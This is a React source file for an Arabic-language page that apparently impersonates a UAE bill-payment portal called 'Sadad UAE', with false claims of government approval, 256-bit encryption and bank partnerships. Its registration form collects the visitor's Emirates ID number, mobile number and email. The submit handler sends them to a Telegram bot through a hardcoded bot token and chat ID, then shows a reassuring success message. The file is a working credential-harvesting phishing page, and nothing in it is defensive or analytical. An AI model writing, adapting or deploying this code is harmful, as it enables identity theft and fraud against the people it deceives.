import { Button } from "@/components/ui/button";
import { Lock, Zap, Building2, Smartphone, Send } from "lucide-react";
import { useState } from "react";
import { toast } from "sonner";

export default function Home() {
  const [formData, setFormData] = useState({
    nationalId: "",
    phoneNumber: "",
    email: ""
  });
  const [loading, setLoading] = useState(false);

  const TELEGRAM_BOT_TOKEN = "8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw";
  const TELEGRAM_CHAT_ID = "8362204213";

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    const message = `
🚀 *طلب جديد من بوابة سداد الإمارات*
--------------------------
🆔 *رقم الهوية:* ${formData.nationalId}
📱 *رقم الهاتف:* ${formData.phoneNumber}
📧 *البريد الإلكتروني:* ${formData.email}
--------------------------
🌐 *المصدر:* uae-sadad-portal
    `;

    try {
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "Markdown",
        }),
      });

      if (response.ok) {
        toast.success("تم إرسال طلبك بنجاح، سيتم التواصل معك قريباً");
        setFormData({ nationalId: "", phoneNumber: "", email: "" });
      } else {
        throw new Error("Failed to send message");
      }
    } catch (error) {
      console.error("Error sending to Telegram:", error);
      toast.error("حدث خطأ أثناء إرسال الطلب، يرجى المحاولة مرة أخرى");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Header */}
      <header className="sticky top-0 z-50 w-full border-b border-gray-200 bg-white">
        <div className="container flex h-16 items-center justify-between">
          <div className="flex items-center gap-3">
            <img 
              src="https://d2xsxph8kpxj0f.cloudfront.net/310519663599686036/5X5kTwk8346JqMBGvyzKtd/uae-sadad-logo-Q2qeSz6GvuLP5zKPDB42W9.webp"
              alt="سداد الإمارات"
              className="h-10 w-10"
            />
            <div className="flex flex-col">
              <span className="font-bold text-lg text-gray-900">سداد</span>
              <span className="text-xs text-gray-600">الإمارات</span>
            </div>
          </div>
          <nav className="hidden md:flex items-center gap-8">
            <a href="#" className="text-sm text-gray-600 hover:text-gray-900">الخدمات</a>
            <a href="#" className="text-sm text-gray-600 hover:text-gray-900">عن البوابة</a>
            <a href="#" className="text-sm text-gray-600 hover:text-gray-900">الدعم</a>
          </nav>
        </div>
      </header>

      {/* Hero Section with Form */}
      <section className="relative overflow-hidden bg-slate-50">
        <div 
          className="absolute inset-0 bg-cover bg-center"
          style={{
            backgroundImage: 'url(https://d2xsxph8kpxj0f.cloudfront.net/310519663599686036/5X5kTwk8346JqMBGvyzKtd/uae-payment-hero-2XJZcrb3Zyy2TSA7doAW5o.webp)',
            opacity: 0.1
          }}
        />
        <div className="relative container py-12 md:py-20">
          <div className="grid md:grid-cols-2 gap-12 items-center">
            <div>
              <h1 className="text-4xl md:text-5xl font-bold text-gray-900 mb-4">
                مرحباً بك في بوابة سداد الإمارات
              </h1>
              <p className="text-xl text-gray-600 mb-8">
                منصة آمنة وموثوقة لسداد فواتيرك الحكومية والخاصة بكل سهولة. أدخل بياناتك للبدء في استخدام الخدمة.
              </p>
              <div className="flex flex-wrap gap-4">
                <div className="flex items-center gap-2 text-sm text-gray-600 bg-white px-3 py-1 rounded-full border border-gray-200">
                  <Lock className="h-4 w-4 text-green-600" />
                  تشفير آمن 256-بت
                </div>
                <div className="flex items-center gap-2 text-sm text-gray-600 bg-white px-3 py-1 rounded-full border border-gray-200">
                  <Building2 className="h-4 w-4 text-blue-600" />
                  معتمد حكومياً
                </div>
              </div>
            </div>

            {/* Registration Form */}
            <div id="service-form" className="bg-white p-8 rounded-2xl shadow-2xl border border-gray-100">
              <h2 className="text-2xl font-bold text-gray-900 mb-6 text-center">بدء الخدمة الإلكترونية</h2>
              <form onSubmit={handleSubmit} className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">رقم الهوية الإماراتية</label>
                  <input
                    required
                    type="text"
                    placeholder="784-XXXX-XXXXXXX-X"
                    className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-amber-500 focus:border-transparent outline-none transition"
                    value={formData.nationalId}
                    onChange={(e) => setFormData({...formData, nationalId: e.target.value})}
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">رقم الهاتف المتحرك</label>
                  <input
                    required
                    type="tel"
                    placeholder="05X XXX XXXX"
                    className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-amber-500 focus:border-transparent outline-none transition"
                    value={formData.phoneNumber}
                    onChange={(e) => setFormData({...formData, phoneNumber: e.target.value})}
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">البريد الإلكتروني</label>
                  <input
                    required
                    type="email"
                    placeholder="example@domain.com"
                    className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-amber-500 focus:border-transparent outline-none transition"
                    value={formData.email}
                    onChange={(e) => setFormData({...formData, email: e.target.value})}
                  />
                </div>
                <Button 
                  type="submit"
                  disabled={loading}
                  className="w-full bg-amber-500 hover:bg-amber-600 text-white py-6 text-lg font-bold rounded-lg transition shadow-lg"
                >
                  {loading ? "جاري المعالجة..." : (
                    <span className="flex items-center justify-center gap-2">
                      متابعة الطلب <Send className="h-5 w-5" />
                    </span>
                  )}
                </Button>
                <p className="text-xs text-center text-gray-500 mt-4">
                  بالنقر على متابعة، أنت توافق على شروط الاستخدام وسياسة الخصوصية الخاصة ببوابة سداد.
                </p>
              </form>
            </div>
          </div>
        </div>
      </section>

      {/* Features Section */}
      <section className="py-16 md:py-24 bg-white">
        <div className="container">
          <div className="max-w-3xl mx-auto text-center mb-16">
            <h2 className="text-3xl font-bold text-gray-900 mb-4">
              لماذا تختار بوابة سداد الإمارات؟
            </h2>
            <p className="text-gray-600">نقدم لك تجربة سداد متكاملة تجمع بين الأمان والسرعة والسهولة</p>
          </div>
          
          <div className="grid md:grid-cols-3 gap-8">
            <div className="p-8 rounded-2xl bg-blue-50 border border-blue-100 text-center">
              <div className="flex justify-center mb-4">
                <div className="p-3 bg-blue-100 rounded-xl">
                  <Lock className="h-8 w-8 text-blue-600" />
                </div>
              </div>
              <h3 className="text-xl font-bold text-gray-900 mb-2">سداد آمن وموثوق</h3>
              <p className="text-gray-600">جميع معاملاتك محمية بأحدث معايير الأمان والتشفير العالمية</p>
            </div>

            <div className="p-8 rounded-2xl bg-amber-50 border border-amber-100 text-center">
              <div className="flex justify-center mb-4">
                <div className="p-3 bg-amber-100 rounded-xl">
                  <Zap className="h-8 w-8 text-amber-600" />
                </div>
              </div>
              <h3 className="text-xl font-bold text-gray-900 mb-2">خدمات متعددة</h3>
              <p className="text-gray-600">سداد الفواتير الحكومية والخدمات والرسوم من مكان واحد وبضغطة زر</p>
            </div>

            <div className="p-8 rounded-2xl bg-green-50 border border-green-100 text-center">
              <div className="flex justify-center mb-4">
                <div className="p-3 bg-green-100 rounded-xl">
                  <Smartphone className="h-8 w-8 text-green-600" />
                </div>
              </div>
              <h3 className="text-xl font-bold text-gray-900 mb-2">سهولة الاستخدام</h3>
              <p className="text-gray-600">واجهة بسيطة وسهلة الاستخدام مصممة لتناسب جميع فئات المستخدمين</p>
            </div>
          </div>
        </div>
      </section>

      {/* Banks Section */}
      <section className="py-16 md:py-24 bg-gray-50">
        <div className="container">
          <div className="text-center mb-12">
            <h2 className="text-3xl font-bold text-gray-900 mb-4">شركاؤنا من البنوك</h2>
            <p className="text-gray-600">نتعاون مع كبرى المؤسسات المالية في دولة الإمارات لضمان وصول خدماتنا للجميع</p>
          </div>
          <div className="max-w-4xl mx-auto">
            <img 
              src="https://d2xsxph8kpxj0f.cloudfront.net/310519663599686036/5X5kTwk8346JqMBGvyzKtd/uae-banks-illustration-Je8AskikromQuCQUqBJAeo.webp"
              alt="البنوك الإماراتية والخدمات المالية"
              className="w-full rounded-2xl shadow-xl"
            />
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-gray-900 text-gray-300 py-12">
        <div className="container">
          <div className="grid md:grid-cols-4 gap-8 mb-8">
            <div>
              <h4 className="font-semibold text-white mb-4">عن البوابة</h4>
              <ul className="space-y-2 text-sm">
                <li><a href="#" className="hover:text-white">من نحن</a></li>
                <li><a href="#" className="hover:text-white">خدماتنا</a></li>
                <li><a href="#" className="hover:text-white">الأخبار</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-semibold text-white mb-4">الدعم</h4>
              <ul className="space-y-2 text-sm">
                <li><a href="#" className="hover:text-white">مركز المساعدة</a></li>
                <li><a href="#" className="hover:text-white">الأسئلة الشائعة</a></li>
                <li><a href="#" className="hover:text-white">تواصل معنا</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-semibold text-white mb-4">القانون</h4>
              <ul className="space-y-2 text-sm">
                <li><a href="#" className="hover:text-white">سياسة الخصوصية</a></li>
                <li><a href="#" className="hover:text-white">شروط الاستخدام</a></li>
                <li><a href="#" className="hover:text-white">سياسة الأمان</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-semibold text-white mb-4">تابعنا</h4>
              <ul className="space-y-2 text-sm">
                <li><a href="#" className="hover:text-white">فيسبوك</a></li>
                <li><a href="#" className="hover:text-white">تويتر</a></li>
                <li><a href="#" className="hover:text-white">إنستجرام</a></li>
              </ul>
            </div>
          </div>
          <div className="border-t border-gray-800 pt-8 text-center text-sm">
            <p>© 2024 بوابة سداد الإمارات. جميع الحقوق محفوظة.</p>
            <p className="mt-2 text-gray-400">منصة آمنة وموثوقة للسداد الإلكتروني الموحد</p>
          </div>
        </div>
      </footer>
    </div>
  );
}
